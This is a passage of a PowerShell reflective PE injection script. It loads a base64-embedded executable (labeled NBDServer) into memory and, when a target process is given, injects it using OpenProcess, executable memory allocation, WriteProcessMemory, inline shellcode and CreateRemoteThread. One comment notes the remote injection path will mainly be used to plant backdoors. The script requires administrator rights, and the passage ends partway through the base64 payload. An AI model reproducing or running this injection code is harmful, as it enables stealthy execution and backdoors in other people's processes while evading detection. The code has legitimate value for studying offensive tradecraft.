        #Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
        if ($PEInfo.FileType -ieq "DLL")
        {
            if ($RemoteLoading -eq $false)
            {
                Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
                $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
                $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
                
                $DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
            }
            else
            {
                $DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            
                if ($PEInfo.PE64Bit -eq $true)
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
                }
                else
                {
                    #Shellcode: CallDllMain.asm
                    $CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
                    $CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
                    $CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
                }
                $SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
                $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
                $SCPSMemOriginal = $SCPSMem
                
                Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
                Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
                $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
                
                $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
                if ($RSCAddr -eq [IntPtr]::Zero)
                {
                    Throw "Unable to allocate memory in the remote process for shellcode"
                }
                
                $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
                if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
                {
                    Throw "Unable to write shellcode to remote process memory."
                }

                $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                if ($Result -ne 0)
                {
                    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
                }
                
                $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            }
        }
        elseif ($PEInfo.FileType -ieq "EXE")
        {
            #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
            [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
            [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
            $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

            #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
            #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
            [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

            $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

            while($true)
            {
                [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                if ($ThreadDone -eq 1)
                {
                    Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                    Write-Verbose "EXE thread has completed."
                    break
                }
                else
                {
                    Start-Sleep -Seconds 1
                }
            }
        }
        
        return @($PEInfo.PEHandle, $EffectivePEHandle)
    }
    
    
    Function Invoke-MemoryFreeLibrary
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $PEHandle
        )
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Call FreeLibrary for all the imports of the DLL
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done unloading the libraries needed by the PE"
                    break
                }

                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                if ($ImportDllHandle -eq $null)
                {
                    Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                }
                
                $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                if ($Success -eq $false)
                {
                    Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
        
        #Call DllMain with process detach
        Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
        $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
        $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
        $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
        if ($Success -eq $false)
        {
            Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
        }
    }


    Function Main
    {
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        $Win32Constants =  Get-Win32Constants
        
        $RemoteProcHandle = [IntPtr]::Zero
    
        #If a remote process to inject in to is specified, get a handle to it
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        

        #Load the PE reflectively
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        if (((Get-WmiObject -Class Win32_Processor).AddressWidth / 8) -ne [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
        {
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
        #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
            #########################################
            ### YOUR CODE GOES HERE
            #########################################
            switch ($FuncReturnType)
            {
                'WString' {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                }

                'String' {
                    Write-Verbose "Calling function with String return type"
                    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
                    if ($StringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
                    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
                    [IntPtr]$OutputPtr = $StringFunc.Invoke()
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
                    Write-Output $Output
                }

                'Void' {
                    Write-Verbose "Calling function with Void return type"
                    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                    if ($VoidFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $VoidFuncDelegate = Get-DelegateType @() ([Void])
                    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
                    $VoidFunc.Invoke() | Out-Null
                }
            }
            #########################################
            ### END OF YOUR CODE
            #########################################
        }
        #For remote DLL injection, call a void function which takes no parameters
        elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
            #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        
        #Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
        if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            #Delete the PE file from memory.
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        
        Write-Verbose "Done!"
    }

    Main
}

#Main function to either run the script locally or remotely
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Error "Script must be run as administrator!" -ErrorAction Stop
    }

    Write-Verbose "PowerShell ProcessID: $PID"

    # base64 -w 0 NBDServer.32.exe > NBDServer.32.b64
    $PEBytes32 = "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